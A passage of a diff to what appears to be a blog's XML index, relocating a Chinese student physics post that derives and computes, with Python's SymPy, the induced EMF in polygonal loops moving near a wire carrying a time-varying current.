+<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204444456.png" alt="image-20200601204444456"></p>
+<center>图5</center>
+<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204425458.png" alt="image-20200601204425458"></p>
+<center>图6</center>
+<p>五边形和六边形的分割成成两个部分，这两个部分分别用梯形的情形2和情形1计算磁通量。详解先图7、图8，程序运行结果见图9、图10.</p>
+<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204504967.png" alt="image-20200601204504967"></p>
+<center>图7</center>
+<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204617490.png" alt="image-20200601204617490"></p>
+<center>图8</center>
+<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204624198.png" alt="image-20200601204624198"></p>
+<center>图9</center>
+<img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204742683.png" alt="image-20200601204742683" style="zoom:80%;">
+<center>图10</center>
+<p>正七边形略微复杂，需要划分成三个部分，但是道理都是相通的。详解见图12，程序运行结果加图13.</p>
+<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204809753.png" alt="image-20200601204809753"></p>
+<center>图12</center>
+<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204843165.png" alt="image-20200601204843165"></p>
+<center>图13</center>
+<p>对任意性的推广做如下解释：</p>
+<ol>
+<li>在编程的时候可以取 $I_0~ = 1, x = 1, v=1, a=1$ 这样的特殊值，这些无关参量对实现任意性没有本质上的影响，但以推广了任意性。</li>
+<li>$I = I_0 \times cos(ω*t)$ 也可以看成是特殊取值，对任何的I=I(t)都是成立的</li>
+<li>同理，此运动也不要求一定是匀速，甚至不要求是直线运动。只用是 $v=v(t)$ 就可以，而非直线运动，只需要得到在垂直于导线的分量即可。（不考虑相对论效应）<br>
+综上实现的计算在任意电流强度变化和任意直线运动（不考虑相对论效应）的电动势，不再局限正弦电流，不局限于参数，不局限于匀速直线运动。</li>
+</ol>
+<p>计算机算力的窥探：下面是正六边形线框对应的电动势的表达式（程序的中间运行结果）。可见如果让我们手算的话，是难以承担的计算量。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ε &#x3D; -(-4\*I0\*a\*µ\*sin(0.3\*π)\*cos(t\*ω) + I0\*a\*µ\*cos(t\*ω))\*(v\*log(-a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 - (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) - v\*log(-a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 + (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) + (v&#x2F;2 - v\*(-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) + (-2\*a\*\*2\*v\*π\*cos(0.4\*π)\*\*2 - 2\*a\*t\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*(-a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 + (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))\*cos(0.4\*π)) - (v&#x2F;2 + v\*(-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) - (-2\*a\*\*2\*v\*π\*cos(0.4\*π)\*\*2 - 2\*a\*t\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*(-a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 - (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))\*cos(0.4\*π))) - (4\*I0\*a\*µ\*sin(0.3\*π)\*cos(t\*ω) - I0\*a\*µ\*cos(t\*ω))\*(v\*log(a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 - (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) - v\*log(a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 + (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) + (v&#x2F;2 - v\*(-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) + (-2\*a\*\*2\*v\*π\*cos(0.4\*π)\*\*2 - 2\*a\*t\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*(a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 + (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))\*cos(0.4\*π)) - (v&#x2F;2 + v\*(-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) - (-2\*a\*\*2\*v\*π\*cos(0.4\*π)\*\*2 - 2\*a\*t\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*(a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 - (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))\*cos(0.4\*π))) - (-log(-a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 - (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)) + log(-a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 + (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))\*(4\*I0\*a\*µ\*ω\*sin(0.3\*π)\*sin(t\*ω) - I0\*a\*µ\*ω\*sin(t\*ω)) - (-log(a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 - (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)) + log(a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 + (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))\*(-4\*I0\*a\*µ\*ω\*sin(0.3\*π)\*sin(t\*ω) + I0\*a\*µ\*ω\*sin(t\*ω)) + (2.0\*I0\*v\*µ\*(a + t\*v\*cos(0.3\*π))\*sin(0.3\*π)\*cos(t\*ω)&#x2F;(sqrt(3)\*a&#x2F;2 + t\*v) + 2.0\*I0\*v\*µ\*log(sqrt(3)\*a&#x2F;2 + t\*v)\*sin(0.3\*π)\*cos(0.3\*π)\*cos(t\*ω) - 2\*I0\*v\*µ\*sin(0.3\*π)\*cos(0.3\*π)\*cos(t\*ω) - 2.0\*I0\*µ\*ω\*(a + t\*v\*cos(0.3\*π))\*log(sqrt(3)\*a&#x2F;2 + t\*v)\*sin(0.3\*π)\*sin(t\*ω) + 2\*I0\*µ\*ω\*(sqrt(3)\*a&#x2F;2 + t\*v)\*sin(0.3\*π)\*sin(t\*ω)\*cos(0.3\*π))&#x2F;(2\*π) - (2.0\*I0\*v\*µ\*(a + t\*v\*cos(0.3\*π))\*sin(0.3\*π)\*cos(t\*ω)&#x2F;(sqrt(3)\*a + t\*v) + 2.0\*I0\*v\*µ\*log(sqrt(3)\*a + t\*v)\*sin(0.3\*π)\*cos(0.3\*π)\*cos(t\*ω) - 2\*I0\*v\*µ\*sin(0.3\*π)\*cos(0.3\*π)\*cos(t\*ω) - 2.0\*I0\*µ\*ω\*(a + t\*v\*cos(0.3\*π))\*log(sqrt(3)\*a + t\*v)\*sin(0.3\*π)\*sin(t\*ω) + 2\*I0\*µ\*ω\*(sqrt(3)\*a + t\*v)\*sin(0.3\*π)\*sin(t\*ω)\*cos(0.3\*π))&#x2F;(2\*π)</span><br></pre></td></tr></table></figure>
+<h2 id="存在的问题和当前解决方案">存在的问题和当前解决方案</h2>
+<p>仍然存在的问题是形状没有真正的任意性，停留在多边形的层次上。</p>
+<p>为了解决这个问题，实现进一步的推广，只能用微元的思想，将一个任意的形状切割成梯形/矩形的微元，然后积分计算。</p>
+<p>由于任意形状又有可能涉及非常不规则的图形，分割了也没有明确的函数表达式，依然不可计算。这里提供一种思路。之前提到梯形的上下底可以平移，那么我们可以将它平移成类似函数的形式：</p>
+<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601205157557.png" alt="image-20200601205157557"></p>
+<p>之后可以用幂级数拟合曲线（泰勒级数），从而可以得到任意形状的函数表达式，当然用傅里叶级数更加合适，因为它对函数图像的要求更低（不需要高阶偏导连续）。</p>
+<p>而函数值即上下的差值，这一点利用计算机的计算还是比较容易解决的。之后再延续上</p>
+<h1>项目原地址</h1>
+<p><a href="https://github.com/ZER0-Nu1L/Physical-programming" target="_blank" rel="noopener">https://github.com/ZER0-Nu1L/Physical-programming</a></p>
+<h1>总结</h1>
+<p>本实验贯彻了大一学习和接触的大部分思想，基于思想投入实践，实现数学思维、物理思维、计算思维的初步融合。<br>
+在理论推导上，结合观察和猜想，利用微元的思想、数学本质分析，实现在电流强度变化的直导线产生的磁场中任意形状线框运动产生电动势。<br>
+在计算思维上，利用计算机的计算能力解决手动求解的繁琐，借助Python的计算生态，避免重复造轮子，快速检索和学习所需模块，实现积分导数计算、数据可视化，首次进行面向对象编程开发，开发了简单的 GUI，<br>
+不足的地方很多，一是UI界面原本想实现调整滑动条的参数来显示结果，但是由于计算规模太大，程序经常卡壳，目前想到的方案是将滑动条对应的每一个状态单独运行出来，保存为图片，之后改变程序内部运行的映射关系，将滑动条每一个状态对应一个科学计算变为滑动条每一个状态对应一张图片。二是理论推导在最后一步没有深入下去，当时分析了好久没有办法推进，可能受限于自己的数学知识。</p>
+<h1>参考文献</h1>
+<ol>
+<li>孙云卿、雷雨.大学物理学(下册)孙云卿（第二版）[M].科学出版社,2017,01-01</li>
+<li>滕保华,、吴喆、廖旭.大学物理学学习指导 [M].科学出版社,2018,09-05</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Development</category>
+        <category>Physics</category>
+      </categories>
+      <tags>
+        <tag>Physics</tag>
+        <tag>GUI</tag>
       </tags>
   </entry>
   <entry>
@@ -1524,116 +1757,6 @@ OpenDayliht 则作为控制器层,对 Mininet 搭建的网络进行拓扑展示�
       </categories>
       <tags>
         <tag>SDN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>在电流强度变化的直导线产生的磁场中任意形状线框运动产生电动势</title>
-    <url>/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/</url>
-    <content><![CDATA[<h1>背景介绍</h1>
-<p>在第十二章节变化的电磁场中计算感生电动势中遇到一道题目中包含比较复杂的数学计算，想通过自己的理论推导和借助计算机的算力将同类问题进行推广、借助计算机计算分析。</p>
-<a id="more"></a>
-<p>原题如下：</p>
-<p>例12-8 长直导线中通有电流 $I=I_0 · cos t (I_0 常量)$ 。有一与之共面的三角形线圈 ABC,已知 AB=a, BC=b。若线圈以垂直于导线方向的速度 v 向右平移, 当 B 点与长直导线的距离为 x 时,求线圈 ABC 中的感应电动势。(如图1所示)</p>
-<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601203930603.png" alt="image-20200601203930603"></p>
-<center>图1</center>
-<p>解：<br>
-将三角形沿竖直方向分为若干宽为 $dr$ 的矩形积分。<br>
-$$<br>
-\begin{aligned}<br>
-\varphi_m &amp;= \int_x^{x + b}{\frac{\mu _oI}{2\pi r}}\left( x+b-r \right) \frac{a}{b}{d}r<br>
-\\<br>
-&amp;= \frac{\mu _oa}{2\pi b}I\cdot \left[ \left( x+b \right) \ln \frac{x + b}{x}-b \right]<br>
-\end{aligned}<br>
-$$</p>
-<p>$$<br>
-\varepsilon_i = -\frac{ d \varphi_m}{dt}<br>
-$$</p>
-<p>$$<br>
-I=I_0 cos \left( {t} \right) , \frac{dx}{dt} = v<br>
-$$</p>
-<p>$$<br>
-\begin{aligned}<br>
-\varepsilon_i<br>
-&amp;= - \frac{\mu_o a}{2 \pi b} \left\{ \frac{dI}{dt} \left[ \left( x+b \right) \ln \frac{x + b}{x} - b \right] +I \frac{d}{dt} \left[ \left( x+b \right) \ln \frac{x + b}{x}-b \right] \right\}<br>
-\\<br>
-&amp;= \frac{\mu_o a I_o \omega }{2 \pi b} \sin \omega t \left[ \left( x+b \right) \ln \frac{x + b}{x} - b \right] +\frac{\mu _o a v}{2 \pi b}I_o \cos \omega t \left( -\ln \frac{x + b}{x} + \frac{b}{x} \right)<br>
-\end{aligned}<br>
-$$</p>
-<h1>猜想和计算推导</h1>
-<h2 id="思路分析">思路分析</h2>
-<p>我们发现这个电动势的计算结果中与α无关，这意味着只要保持三角形的高不变，将顶点C沿着平行于AB的方向移动，就不会改变对应的电动势，这是实现推广到任意形状的线框的基础。</p>
-<p>本例如果借助编程语言，最关键的并不是我们手算时遇到的数学上的困难（积分，求导时x和I都是t的函数，需要用对应的求导法则），这里的数学问题可以用MATLAB轻松解决，这里为了一元化，从数学计算到数据可视化，再到GUI界面展示，都是用Python。所以这里没有使用MATLAB，而用了Python的SymPy。</p>
-<p>所以现在求电动势式对t求导已经不再是我们遇到最麻烦的问题，推广到任意形状的关键是在任意形状的线框在磁场内的磁通量的求解上。</p>
-<h2 id="推广到梯形">推广到梯形</h2>
-<p>我们可以先把三角形推广到梯形。</p>
-<p>需要分两种情况：一种是梯形的底离直导线更近，一种是梯形的底离直导线更近更远；</p>
-<p>1、梯形的底离直导线更近的情况如图2所示</p>
-<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601203951198.png" alt="image-20200601203951198"></p>
-<center>图2</center>
-<p>2、梯形的底离直导线更远的情况如图3所示</p>
-<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204023480.png" alt="image-20200601204023480"></p>
-<center>图3</center>
-<p>类似于我们在例12-8中发现，在梯形中电动势的计算结果中与α无关，这意味着只要保持梯形的高不变，将梯形的平行的两条边C沿着平行的方向移动，就不会改变对应的电动势。</p>
-<p>于此基础上，我们可以把任意的多边形分割成若干个梯形，其中梯形分成两种，一种是梯形的底离直导线更近的梯形，一种是梯形的底离直导线更近更远的梯形。</p>
-<h2 id="用程序计算特定形状对应的电动势和进一步推广解释">用程序计算特定形状对应的电动势和进一步推广解释</h2>
-<p>我们用程序分别对正三角形、正方形、正五边形、正六边形、正七边形在电流强度变化的直导线产生的磁场中任意形状线框运动产生电动势。从中解释任意性。</p>
-<p>正三角形、正方形直接套用情形1（注意a, b, c对应梯形情形中的a, b, c），矩形分析如图4 所示，程序运行结果见图5 、图6。</p>
-<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204413252.png" alt="image-20200601204413252"></p>
-<center>图4</center>
-<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204444456.png" alt="image-20200601204444456"></p>
-<center>图5</center>
-<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204425458.png" alt="image-20200601204425458"></p>
-<center>图6</center>
-<p>五边形和六边形的分割成成两个部分，这两个部分分别用梯形的情形2和情形1计算磁通量。详解先图7、图8，程序运行结果见图9、图10.</p>
-<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204504967.png" alt="image-20200601204504967"></p>
-<center>图7</center>
-<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204617490.png" alt="image-20200601204617490"></p>
-<center>图8</center>
-<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204624198.png" alt="image-20200601204624198"></p>
-<center>图9</center>
-<img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204742683.png" alt="image-20200601204742683" style="zoom:80%;">
-<center>图10</center>
-<p>正七边形略微复杂，需要划分成三个部分，但是道理都是相通的。详解见图12，程序运行结果加图13.</p>
-<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204809753.png" alt="image-20200601204809753"></p>
-<center>图12</center>
-<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601204843165.png" alt="image-20200601204843165"></p>
-<center>图13</center>
-<p>对任意性的推广做如下解释：</p>
-<ol>
-<li>在编程的时候可以取 $I_0~ = 1, x = 1, v=1, a=1$ 这样的特殊值，这些无关参量对实现任意性没有本质上的影响，但以推广了任意性。</li>
-<li>$I = I_0 \times cos(ω*t)$ 也可以看成是特殊取值，对任何的I=I(t)都是成立的</li>
-<li>同理，此运动也不要求一定是匀速，甚至不要求是直线运动。只用是 $v=v(t)$ 就可以，而非直线运动，只需要得到在垂直于导线的分量即可。（不考虑相对论效应）<br>
-综上实现的计算在任意电流强度变化和任意直线运动（不考虑相对论效应）的电动势，不再局限正弦电流，不局限于参数，不局限于匀速直线运动。</li>
-</ol>
-<p>计算机算力的窥探：下面是正六边形线框对应的电动势的表达式（程序的中间运行结果）。可见如果让我们手算的话，是难以承担的计算量。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ε &#x3D; -(-4\*I0\*a\*µ\*sin(0.3\*π)\*cos(t\*ω) + I0\*a\*µ\*cos(t\*ω))\*(v\*log(-a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 - (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) - v\*log(-a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 + (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) + (v&#x2F;2 - v\*(-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) + (-2\*a\*\*2\*v\*π\*cos(0.4\*π)\*\*2 - 2\*a\*t\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*(-a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 + (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))\*cos(0.4\*π)) - (v&#x2F;2 + v\*(-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) - (-2\*a\*\*2\*v\*π\*cos(0.4\*π)\*\*2 - 2\*a\*t\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*(-a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 - (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))\*cos(0.4\*π))) - (4\*I0\*a\*µ\*sin(0.3\*π)\*cos(t\*ω) - I0\*a\*µ\*cos(t\*ω))\*(v\*log(a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 - (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) - v\*log(a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 + (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) + (v&#x2F;2 - v\*(-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) + (-2\*a\*\*2\*v\*π\*cos(0.4\*π)\*\*2 - 2\*a\*t\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*(a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 + (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))\*cos(0.4\*π)) - (v&#x2F;2 + v\*(-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*\*2\*cos(0.4\*π)) - (-2\*a\*\*2\*v\*π\*cos(0.4\*π)\*\*2 - 2\*a\*t\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*(a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 - (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))\*cos(0.4\*π))) - (-log(-a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 - (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)) + 